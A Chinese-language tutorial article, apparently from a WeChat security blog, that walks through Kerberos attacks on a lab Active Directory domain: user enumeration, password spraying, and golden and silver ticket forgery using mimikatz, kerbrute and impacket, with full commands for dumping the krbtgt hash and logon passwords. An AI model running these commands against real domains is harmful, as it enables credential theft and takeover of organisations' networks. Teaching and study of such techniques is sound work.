<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/amboKFZ7CTi2QZMJtKx4hg)

### 域用户枚举

首先我们来看一下域用户枚举，域用户枚举通常发生在 AS_REQ 阶段，当我们去访问域内某个服务的时候，需要向 KDC 的 AS 服务发送 AS_REQ 请求，请求包中包含了用户名，域名，加密时间戳以及预认证等信息，预认证是通过用户的 Hash 去加密的时间戳，然后 AS 服务会去活动目录中查找对应用户 Hash 进行比对，如果比对成功的话，那么预认证就成功了。

我们前面说到过主要是 cname 这个字段，用户存在或不存在，以及密码错误和正确的响应包是不一样的。

这里我们先使用 MSF 对域内用户进行枚举操作。

首先我们在活动目录中创建了如下 3 个账户。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbQiamC9ibGbT9v2dM1aqMVsQHNDtXia6bz6Td1Okf4nXbib2owJMzMOwibnA/640?wx_fmt=png&from=appmsg)

需要注意的是，如果你使用的是 kali，那么需要将 dns 设置为 DC 的地址。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbgJcG2icLDUgMA5KJBrozuFChibuvpBsE8Jx7O0xL6eiaib9lumaCrNKYBg/640?wx_fmt=png&from=appmsg)

这里使用`auxiliary/gather/kerberos_enumusers`模块进行枚举。

```
set rhost dc的ip地址
set user_file 要使用的用户字典
set domain relaysec.com
exploit

```

可以看到用户已经枚举出来了，zhangsan,lisi,wangwu 。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkb3y6hV8cDApfaJ48fmYKicrv5MhGeAbBCltYcYAek6U9NMfED4C8VEgg/640?wx_fmt=png&from=appmsg)

我们也可以使用`kerbrute`这个工具进行枚举。

下载地址如下:

```
https://github.com/ropnop/kerbrute/releases

```

```
./kerbrute_linux_amd64 userenum --dc 10.10.211.130 -d relaysec.com user.txt

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbaU61v7RlT0F8UmRMs8qVwNJDeDqK0AedjNYK5jbmibdxnnpdmTIcG1A/640?wx_fmt=png&from=appmsg)

也可以使用 python 版本的。

下载地址如下:

```
https://github.com/3gstudent/pyKerbrute

```

```
python2 EnumADUser.py 10.10.211.130 relaysec.com ../user.txt udp
python2 EnumADUser.py 10.10.211.130 relaysec.com ../user.txt tcp

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbRIuGLExYkfaEuxugsGGXAoAEwiaHQib4iaRXmhCgthGFBJ6RzejWO3Q1Q/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbGgHm4FAZVP6OTDRCHOhlQavOia7TlwEG4eIperPZjWrQDu2Gice6xReA/640?wx_fmt=png&from=appmsg)

接下来我们使用 wireshark 抓包来看一下。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbxZbcAgZBnQrmicTuRmFsOPePCuXtlMSadxJI3Q1KbA28CE3PibmhNNFA/640?wx_fmt=png&from=appmsg)

可以看到当用户存在的时候返回包会报错为`KRB6KDC_ERR_PREAUTH_REQUITED。`

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkboF0j4I1UYXLs5BxDFhR82eUHHmGMjGFgahnSmkicPL68LRWlLCNwKoQ/640?wx_fmt=png&from=appmsg)

``如果用户不存在的时候会报错为`KRBTKDC_ERR_PRINCIPAL_UNKNOWN`。``

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbGwZGQ2D5Qf5LVd4kpTCOLZo1kMvXGp0lKSInicZ9Bcu5yI0hibIrWOBQ/640?wx_fmt=png&from=appmsg)

### 密码喷洒

既然我们已经搞懂了枚举用户，那么我们现在可以来进行密码喷洒，所谓密码喷洒其实就是使用一个密码跟多个用户名进行比对，其实就相当于一对多的概念。

我们前面说到过，用户名存在或不存在的时候报错是不一样的，那么密码正确和不正确的情况下，报错也是不一样的。所以我们可以进行域内用户的密码喷洒。

我们可以使用`kerbrute`工具进行密码喷洒。

```
./kerbrute_linux_amd64 passwordspray --dc 10.10.211.130 -d relaysec.com user.txt Admin123..

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkb0iaAEw4usFjkqicyTetLqt1P078IeibDsDAbtHwcn8e4576FlALgicr4EA/640?wx_fmt=png&from=appmsg)

也可以使用`DomainPasswordSpray`工具等等。我们来看下 wireshark 的抓包情况。

我们主要看这三组，其实对应就是如上喷洒出来的 lisi,wangwu,zhangsan 这三个用户。

可以看到这三组都成功得到了 AS_REP 响应，而其他并没有得到。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbMEs0YbkrTkCHEG1hyO2iaovSQc6EviaZg1sUUNqtASUXe1vXNrQhW20w/640?wx_fmt=png&from=appmsg)

### Hash 传递

Hash 传递是产生在 AS_REQ 阶段的，也就是预认证阶段发生的，时间戳是通过我们用户的 Hash 进行加密的，发送到 AS 服务，AS 去活动那个目录中查找到用户 Hash 进行解密，解密成功的话表示预认证成功，那么如果我们使用域管的 Hash 加密时间戳的话，就可以造成 Hash 传递的攻击。

### 黄金票据攻击

我们前面都知道黄金票据是发生在 AS_REP 阶段的，它主要伪造的 TGT 认购权证，所需要的是 krbtgt 用户的 Hash，因为 enc-part 是通过 krbtgt 用户的 hash 进行加密的，所以如果我们可以获取到 krbtgt 用户 hash，那么自然就可以伪造 TGT 认购权证。

那么制作黄金票据的条件是什么呢？这也是面试的时候经常问到的。

如下条件:

```
1.域名
2.域的SID值 (Object Security ID)
3.KRBTGT账户NTLM密码哈希
4.需要伪造的用户名 //一般都是域管理员

```

那么我们首先肯定是需要获取到 krbtgt 用户的 hash，这一般都是拿到域控之后才能获取的到的，所以黄金票据一般也用于权限维持。

这里我们可以直接使用`` `mimikatz``进行导出。

```
privilege::debug
lsadump::dcsync /domain:relaysec.com /user:krbtgt

```

我们将 SID 和 krbtgt 用户 hash 提取出来即可。

需要注意的是这里的 502 不要加上。前面才是域的 SID。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbCuibbM2Egth2kfjFqIXEPSzp8ceqUYg6jP23EsdvPibBcDpqk29twLwQ/640?wx_fmt=png&from=appmsg)

除了这个方式来获取域的 SID 之外，我们也可以使用`wmic`命令来进行获取。

```
wmic useraccount get name,sid

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbqoREmX8UlG8ialIw54EnRv8UZVicy3Rsky6MiaNiaf8TyV0RTRvF5UhOBQ/640?wx_fmt=png&from=appmsg)

现在我们已经获取到了域 SID 以及 krbtgt 账户的 hash，现在我们就可以进行黄金票据攻击了。

首先在 win2016 这台机器上是无法访问 dc 的 cifs 服务的。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbqWJkmEJTC0CIbSCbnMxKKUpvhrg6wXhxCWNnehp9JBg6SgyTAuEJ3Q/640?wx_fmt=png&from=appmsg)

现在我们将 mimikatz 传递上去，使用如下命令进行金票传递。

```
kerberos::golden /user:administrator(这里是伪造的用户 一般都是域管理员) /domain:relaysec.com(域名) /sid:使用mimikatz导出来的域SID /krbtgt:krbtgt用户的hash /ticket:relaysec.kirbi

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbZpvrX5AcUU5KAMhcsFa9CVBMlopxTaW2r6zQ2LA4AcIGjsXHbb11rA/640?wx_fmt=png&from=appmsg)

然后使用 kekeo 或者 mimikatz 将票据注入到内存中。

```
kerberos::ptt relaysec.kirbi

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbMYW3dZfLwICPtqx0QJBaZXmEozNFPOTIRAG83qxMuPulDsynjgktTw/640?wx_fmt=png&from=appmsg)

我们也可以使用`impacket套件` 这个是我比较喜欢的，直接远程就可以申请。

```
python3 ticketer.py -domain-sid S-1-5-21-3708176772-1742723060-3616893896 -nthash 020e7d1a8421a3219131c1b7ea106710 -domain relaysec.com administrator 

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbVE2DOyj3GSwslBiaD9WTk38jOA4iaA6uP1v5OgTcBsCHWprVna1Q6VLg/640?wx_fmt=png&from=appmsg)

然后通过`export`命令导入票据即可。

```
export KRB5CCNAME=administrator.ccache

```

然后我们就可以使用`secretsdump`工具导出所有用户的 Hash。

```
python3 secretsdump.py -k -no-pass administrator@dc.relaysec.com -dc-ip 10.10.211.130 -just-dc-user administrator

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbwDVLWJRc5qOibheQZJOP17WMlibriaaWPNXYsYjkECpAUeVqcFOkONgIQ/640?wx_fmt=png&from=appmsg)

也可以直接访问域控。

```
python3 smbexec.py -no-pass -k administrator@dc.relaysec.com -dc-ip 10.10.211.130

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkb9jzMia0cLicgRyRcickLeECnKsWCmjag0N0XXoMA82SZERK0ibticH0ELxg/640?wx_fmt=png&from=appmsg)

所以是比较推荐使用`impacket`套件的，不推荐使用`mimikatz`。

### 白银票据攻击

我们前面都知道白银票据的话伪造的是 ST 服务票据，这样的话其实权限就很小了，只能访问特定的服务，比如 cifs，winrm，dns 等等。

而利用的要求当然也比黄金票据来说比较容易一些。比如说我们拿到了域内普通的域机器也是可以伪造白银票据的，不光是域控。

要求如下：

```
域名
域的sid
可利用的服务
目标主机的Hash

```

首先我们需要获取到域的 SID，和上面一样，可以使用`mimikatz` 也可以使用`wmic` ，这里我们就直接使用`wmic`即可。

紧接着我们需要获取到域主机的 Hash，这里需要记住的是域内主机的 Hash，而不是域用户的 hash。

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > hash.txt

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbnMVczhtjYiaffBM4icmxqUrA5S6J4CDmcfyuOwnLdQgG7gNQL1HL7Plw/640?wx_fmt=png&from=appmsg)

拿到域主机 Hash 之后，我们就可以进行伪造了。需要注意的是这里的 cmd 是以管理员的方式打开的，一般在实战中我们也是提升到 system 权限之后来打开 mimikatz，需要注意的是这里的管理员不是域管理员而是它本机的管理员。

```
mimikatz.exe "kerberos::golden /domain:relaysec.com /sid:S-1-5-21-3708176772-1742723060-3616893896 /target:dc.relaysec.com /service:cifs /rc4:
54b87e4dd87275461e4ad2285d9dc848 /user:administrator /ticket:admin.kirbi" "exit"

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbRcBJWgatu7sdrneBwr0fuPhhzAgn6DibZ7DTxsAuyJpOE6aa0xA2ibtA/640?wx_fmt=png&from=appmsg)

`然后我们将票据导入进去。`

```
kerberos::ptt admin.kirbi

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbz5GBlQ2MWqbpF9922rdWsWx0mJ4wPhBEtTRzlLdqwn5pjLZUibmJUJw/640?wx_fmt=png&from=appmsg)

`导入进去之后我们也可以使用klist进行查看。`

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkb8mJgcEOkmNvGO0bgPfOXyMhyll6uzIWgxm8TeTXlkUhTwMksibHy3bg/640?wx_fmt=png&from=appmsg)

`最终我们尝试访问DC的cifs服务。`

```
dir \\dc.relaysec.com\c$

```

`成功访问。`

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mrlJql5Rf8mpdKDlEp0UAkbpZ81DhHda3tS89hzKY0TtbHdcURGiaNfeASicFo5ZYdx1xLHIPlz55nw/640?wx_fmt=png&from=appmsg)

如上就是 kerberos 中的攻击手法了。其它的一些攻击方法可以自行 Google，这里就不作演示了。

### 结束语

`文章到这里就暂时结束啦  期待和您的下次相遇！！！`